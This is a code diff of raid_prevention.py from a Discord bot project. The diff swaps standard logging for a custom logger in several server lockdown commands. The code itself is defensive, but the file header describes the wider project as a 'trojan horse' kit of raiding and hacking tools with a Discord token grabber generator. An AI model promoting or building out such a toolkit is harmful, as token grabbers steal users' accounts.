@@ -1,5 +1,5 @@
 """
-Discord Raidkit v2.3.4 — "The trojan horse of discord raiding"
+Discord Raidkit v2.3.5 — "The trojan horse of discord raiding"
 Copyright © 2023 the-cult-of-integral
 
 a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3
@@ -8,10 +8,9 @@ This program is under the GNU General Public License v2.0.
 https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE
 
 raid_prevention.py stores the raid prevention commands for Anubis.
-raid_prevention.py was last updated on 05/03/23 at 20:49 UTC.
+raid_prevention.py was last updated on 19/04/23 at 23:43 UTC.
 """
 
-import logging
 import os
 import sqlite3
 
@@ -20,9 +19,10 @@ from discord import app_commands
 from discord.app_commands import Choice
 from discord.ext import commands
 
-from utils import init_logger, mkfile
+import utils.log_utils as lu
+from utils.io_utils import mkfile
 
-init_logger()
+lu.init()
 
 DB_PATH = os.path.join('databases', 'anubis.db')
 
@@ -32,7 +32,8 @@ class RaidPrevention(commands.Cog):
         self.bot = bot
 
         if not os.path.exists(DB_PATH):
-            logging.info(f'{DB_PATH} does not exist. Creating...')
+            lu.sinfo(lu.F_RAID_PREVENTION, 'RaidPrevention.__init__', 
+                     f'{DB_PATH} does not exist. Creating...')
             mkfile(DB_PATH)
 
         self.conn = sqlite3.connect(DB_PATH)
@@ -87,8 +88,8 @@ class RaidPrevention(commands.Cog):
             await interaction.followup.send(embed=embed)
 
         except Exception as e:
-            logging.error(
-                f'Error in raid_prevention.py - lock(): {e}')
+            lu.serror(lu.F_RAID_PREVENTION, 'RaidPrevention.lock',
+                f'Uncaught error: {e}')
             await interaction.followup.send(f'Error: {e}')
 
     @app_commands.command(
@@ -139,8 +140,8 @@ class RaidPrevention(commands.Cog):
             await interaction.followup.send(embed=embed)
 
         except Exception as e:
-            logging.error(
-                f'Error in raid_prevention.py - unlock(): {e}')
+            lu.serror(lu.F_RAID_PREVENTION, 'RaidPrevention.unlock',
+                f'Uncaught error: {e}')
             await interaction.followup.send(f'Error: {e}')
 
     @app_commands.command(
@@ -184,8 +185,8 @@ class RaidPrevention(commands.Cog):
             await interaction.followup.send(embed=embed)
 
         except Exception as e:
-            logging.error(
-                f'Error in raid_prevention.py - lockdown(): {e}')
+            lu.serror(lu.F_RAID_PREVENTION, 'RaidPrevention.lockdown',
+                f'Uncaught error: {e}')
             await interaction.followup.send(f'Error: {e}')
 
     @app_commands.command(
@@ -230,8 +231,8 @@ class RaidPrevention(commands.Cog):
             await interaction.followup.send(embed=embed)
 
         except Exception as e:
-            logging.error(
-                f'Error in raid_prevention.py - unlockdown(): {e}')
+            lu.serror(lu.F_RAID_PREVENTION, 'RaidPrevention.unlockdown',
+                f'Uncaught error: {e}')
             await interaction.followup.send(f'Error: {e}')
 
     @app_commands.command(
@@ -278,8 +279,8 @@ class RaidPrevention(commands.Cog):
             await interaction.followup.send(embed=embed)
 
         except Exception as e:
-            logging.error(
-                f'Error in raid_prevention.py - toggle(): {e}')
+            lu.serror(lu.F_RAID_PREVENTION, 'RaidPrevention.toggle',
+                f'Uncaught error: {e}')
             await interaction.followup.send(f'Error: {e}')
         return
 
@@ -317,8 +318,8 @@ class RaidPrevention(commands.Cog):
             await interaction.followup.send(embed=embed)
 
         except Exception as e:
-            logging.error(
-                f'Error in raid_prevention.py - set_log_channel(): {e}')
+            lu.serror(lu.F_RAID_PREVENTION, 'RaidPrevention.set_log_channel',
+                f'Uncaught error: {e}')
             await interaction.followup.send(f'Error: {e}')
         return
 
@@ -364,8 +365,8 @@ class RaidPrevention(commands.Cog):
             await interaction.followup.send(embed=embed)
 
         except Exception as e:
-            logging.error(
-                f'Error in raid_prevention.py - prevent(): {e}')
+            lu.serror(lu.F_RAID_PREVENTION, 'RaidPrevention.prevent',
+                f'Uncaught error: {e}')
             await interaction.followup.send(f'Error: {e}')
         return
 
@@ -426,8 +427,8 @@ class RaidPrevention(commands.Cog):
             self.c.execute(query, args)
             return True
         except Exception as e:
-            logging.error(
-                f'Error in raid_prevention.py - __exec_select(): {e}')
+            lu.serror(lu.F_RAID_PREVENTION, '',
+                f'Uncaught error: {e}')
             return False
 
     def __exec_nonselect(self, query: str, *args) -> bool:
@@ -436,8 +437,8 @@ class RaidPrevention(commands.Cog):
             self.conn.commit()
             return True
         except Exception as e:
-            logging.error(
-                f'Error in raid_prevention.py - __exec_nonselect(): {e}')
+            lu.serror(lu.F_RAID_PREVENTION, '',
+                f'Uncaught error: {e}')
             return False
 
 
